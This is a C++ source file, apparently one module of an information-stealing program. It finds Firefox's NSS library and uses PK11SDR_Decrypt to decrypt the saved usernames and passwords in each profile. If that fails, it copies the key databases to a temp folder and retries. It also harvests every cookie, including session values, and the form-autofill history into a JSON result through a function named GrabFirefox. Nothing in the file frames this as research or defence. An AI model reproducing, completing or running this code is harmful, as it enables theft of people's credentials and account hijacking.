
#pragma once
#include <windows.h>
#include <tlhelp32.h>
#include <functional>
#include <string>
#include <vector>

namespace ff {

inline std::wstring DirOfRunning(const wchar_t* exe) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return {};
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    std::wstring dir;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exe) != 0) continue;
            HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (!h) continue;
            wchar_t buf[MAX_PATH] = {}; DWORD n = MAX_PATH;
            if (QueryFullProcessImageNameW(h, 0, buf, &n)) {
                std::wstring p(buf, n);
                size_t slash = p.find_last_of(L'\\');
                if (slash != std::wstring::npos) dir = p.substr(0, slash);
            }
            CloseHandle(h);
            if (!dir.empty()) break;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return dir;
}

inline std::wstring RegValue(HKEY root, const wchar_t* sub, const wchar_t* val, REGSAM wow) {
    HKEY k = nullptr;
    if (RegOpenKeyExW(root, sub, 0, KEY_QUERY_VALUE | wow, &k) != ERROR_SUCCESS) return {};
    wchar_t buf[MAX_PATH] = {}; DWORD sz = sizeof(buf) - sizeof(wchar_t), type = 0;
    LONG rc = RegQueryValueExW(k, val, nullptr, &type, reinterpret_cast<LPBYTE>(buf), &sz);
    RegCloseKey(k);
    if (rc != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ)) return {};
    return buf;
}

inline std::vector<std::wstring> Nss3Candidates() {
    static const wchar_t* kUninstall =
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Mozilla Firefox";
    const REGSAM views[] = { KEY_WOW64_64KEY, KEY_WOW64_32KEY, 0 };

    std::vector<std::wstring> dirs;
    auto push = [&](std::wstring d) {
        if (d.empty()) return;
        for (auto& e : dirs) if (e == d) return;
        dirs.push_back(std::move(d));
    };

    for (REGSAM v : views)
        for (HKEY root : { HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER }) {
            std::wstring loc = RegValue(root, kUninstall, L"InstallLocation", v);
            if (!loc.empty() && loc.back() == L'\\') loc.pop_back();
            push(loc);
        }
    {
        wchar_t pf[MAX_PATH] = {}, pf86[MAX_PATH] = {};
        SHGetFolderPathW(nullptr, CSIDL_PROGRAM_FILES, nullptr, 0, pf);
        SHGetFolderPathW(nullptr, CSIDL_PROGRAM_FILESX86, nullptr, 0, pf86);
        push(std::wstring(pf) + L"\\Mozilla Firefox");
        push(std::wstring(pf86) + L"\\Mozilla Firefox");
    }
    push(DirOfRunning(L"firefox.exe"));

    std::vector<std::wstring> out;
    for (auto& d : dirs) {
        std::wstring p = d + L"\\nss3.dll";
        if (GetFileAttributesW(p.c_str()) != INVALID_FILE_ATTRIBUTES)
            out.push_back(std::move(p));
    }
    return out;
}

struct SECItem { unsigned int type; unsigned char* data; unsigned int len; };

using FnNSSInit  = int  (*)(const char*);
using FnNSSDone  = int  (*)(void);
using FnSDR      = int  (*)(SECItem*, SECItem*, void*);
using FnPortFree = void (*)(void*);

struct Api {
    HMODULE     mod  = nullptr;
    FnNSSInit   init = nullptr;
    FnNSSDone   done = nullptr;
    FnSDR       sdr  = nullptr;
    FnPortFree  free = nullptr;
    int (*perr)()    = nullptr;
    bool        ok   = false;
    size_t      ci   = 0;
    int  lastSz = 0, lastRc = 0, lastNss = 0, lastStage = 0;

    const std::vector<std::wstring>& cands() {
        static const std::vector<std::wstring> v = Nss3Candidates();
        return v;
    }

    bool start(size_t i) {
        if (i >= cands().size()) return false;
        ci = i;
        mod = LoadLibraryExW(cands()[i].c_str(), nullptr, 0x00000008);
        if (!mod) return false;
        init = (FnNSSInit)  GetProcAddress(mod, "NSS_Init");
        done = (FnNSSDone)  GetProcAddress(mod, "NSS_Shutdown");
        sdr  = (FnSDR)      GetProcAddress(mod, "PK11SDR_Decrypt");
        free = (FnPortFree) GetProcAddress(mod, "PORT_Free");
        perr = (int(*)())   GetProcAddress(mod, "PORT_GetError");
        ok = init && done && sdr;
        if (!ok) { unload(); return false; }
        return true;
    }

    void unload() {
        if (mod) FreeLibrary(mod);
        mod = nullptr; init = nullptr; done = nullptr; sdr = nullptr;
        free = nullptr; perr = nullptr; ok = false;
    }

    bool load()  { return mod ? ok : start(ci); }
    bool next()  { unload(); return start(ci + 1); }
    bool exhausted() { return ci + 1 >= cands().size(); }

    std::string decrypt(const std::string& b64field) {
        lastStage = 1;
        if (!ok || b64field.empty()) return {};
        DWORD sz = 0;
        CryptStringToBinaryA(b64field.c_str(), 0, CRYPT_STRING_BASE64,
                             nullptr, &sz, nullptr, nullptr);
        if (!sz || sz > (1u << 20)) { lastStage = 2; lastSz = (int)sz; return {}; }
        std::vector<unsigned char> raw(sz);
        DWORD out = sz;
        if (!CryptStringToBinaryA(b64field.c_str(), 0, CRYPT_STRING_BASE64,
                                  raw.data(), &out, nullptr, nullptr)) {
            lastStage = 3;
            return {};
        }
        lastSz = (int)out;
        SECItem in{ 0, raw.data(), out };
        SECItem res{ 0, nullptr, 0 };
        lastRc = sdr(&in, &res, nullptr);
        lastNss = perr ? perr() : -1;
        lastStage = 4;
        if (lastRc != 0 || !res.data || !res.len) return {};
        std::string val(reinterpret_cast<char*>(res.data), res.len);
        if (free) free(res.data);
        while (!val.empty() && val.back() == '\0') val.pop_back();
        lastStage = 5;
        return val;
    }
};

inline Api& api() { static Api a; return a; }

inline void SqlEach(const fs::path& db, const char* sql,
                    const std::function<void(sqlite3_stmt*)>& onRow) {
    std::string tmp = CopyDb(db);
    if (tmp.empty()) return;
    sqlite3* h = nullptr;
    if (sqlite3_open_v2(tmp.c_str(), &h, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK) {
        sqlite3_stmt* st = nullptr;
        if (sqlite3_prepare_v2(h, sql, -1, &st, nullptr) == SQLITE_OK) {
            while (sqlite3_step(st) == SQLITE_ROW) onRow(st);
            sqlite3_finalize(st);
        }
        sqlite3_close(h);
    }
    fs::remove(tmp);
}

inline const char* col(sqlite3_stmt* st, int i) {
    const char* t = (const char*)sqlite3_column_text(st, i);
    return t ? t : "";
}

}

inline json GrabFirefox(const std::string& name, const std::wstring& roamPath) {
    json result;
    result["browser"] = name;
    result["logins"]   = json::array();
    result["cookies"]  = json::array();
    result["autofill"] = json::array();
    result["cards"]    = json::array();

    if (roamPath.empty()) return result;
    fs::path base = fs::path(GetRoaming()) / roamPath;
    std::error_code ec;
    if (!fs::exists(base, ec)) return result;

    for (auto& e : fs::directory_iterator(base, ec)) {
        if (!e.is_directory()) continue;
        fs::path prof = e.path();
        if (!fs::exists(prof / "logins.json", ec) &&
            !fs::exists(prof / "cookies.sqlite", ec) &&
            !fs::exists(prof / "formhistory.sqlite", ec))
            continue;
        std::string pname = prof.filename().string();

        fs::path lj = prof / "logins.json";
        if (fs::exists(lj, ec)) {
            int added = 0, emptyEnc = 0, decFail = 0, badParse = 0;
            while (true) {
                if (!ff::api().load()) break;
                added = emptyEnc = decFail = badParse = 0;

                bool inited = ff::api().init(prof.string().c_str()) == 0;
                fs::path tmpDir;
                if (!inited) {
                    tmpDir = fs::temp_directory_path() /
                             (L"ffnss" + std::to_wstring(GetTickCount64()));
                    fs::create_directories(tmpDir, ec);
                    static const wchar_t* kNeed[] = {
                        L"key4.db", L"cert9.db", L"pkcs11.txt",
                        L"key3.db", L"cert8.db", L"secmod.db",
                    };
                    for (auto n : kNeed) {
                        fs::path s = prof / n;
                        if (fs::exists(s, ec))
                            fs::copy_file(s, tmpDir / n,
                                          fs::copy_options::overwrite_existing, ec);
                    }
                    inited = ff::api().init(tmpDir.string().c_str()) == 0;
                }
                if (!inited) { if (!tmpDir.empty()) fs::remove_all(tmpDir, ec); break; }

                try {
                    std::ifstream f(lj);
                    json j = json::parse(f, nullptr, false);
                    if (j.is_discarded()) badParse = 1;
                    if (!j.is_discarded() && j.contains("logins") && j["logins"].is_array()) {
                        for (auto& rec : j["logins"]) {
                            if (!rec.is_object()) continue;
                            std::string encP = rec.value("encPassword",
                                               rec.value("encryptedPassword", ""));
                            std::string encU = rec.value("encUserName",
                                               rec.value("encryptedUsername", ""));
                            if (encP.empty()) { emptyEnc++; continue; }
                            std::string pass = ff::api().decrypt(encP);
                            std::string user = ff::api().decrypt(encU);
                            if (pass.empty() && user.empty()) { decFail++; continue; }
                            added++;
                            result["logins"].push_back({
                                {"url",     rec.value("hostname", "")},
                                {"user",    user},
                                {"pass",    pass},
                                {"profile", pname}
                            });
                        }
                    }
                } catch (...) {
                }

                ff::api().done();
                if (!tmpDir.empty()) fs::remove_all(tmpDir, ec);

                if (added > 0 || decFail == 0) break;
                result["logins"] = json::array();
                if (ff::api().exhausted()) break;
                ff::api().next();
            }
        }

        fs::path ck = prof / "cookies.sqlite";
        if (fs::exists(ck, ec)) {
            ff::SqlEach(ck,
                "SELECT host, name, value, path, expiry, isSecure FROM moz_cookies",
                [&](sqlite3_stmt* st) {
                    std::string v = ff::col(st, 2);
                    if (v.empty()) return;
                    result["cookies"].push_back({
                        {"browser", "Firefox"}, {"profile", pname},
                        {"host",    ff::col(st, 0)}, {"name", ff::col(st, 1)},
                        {"value",   v},              {"path", ff::col(st, 3)},
                        {"expires", sqlite3_column_int64(st, 4)},
                        {"secure",  sqlite3_column_int(st, 5) != 0}
                    });
                });
        }

        fs::path af = prof / "formhistory.sqlite";
        if (fs::exists(af, ec)) {
            ff::SqlEach(af, "SELECT fieldname, value FROM moz_formhistory",
                [&](sqlite3_stmt* st) {
                    result["autofill"].push_back({
                        {"field",   ff::col(st, 0)},
                        {"value",   ff::col(st, 1)},
                        {"profile", pname}
                    });
                });
        }
    }
    return result;
}
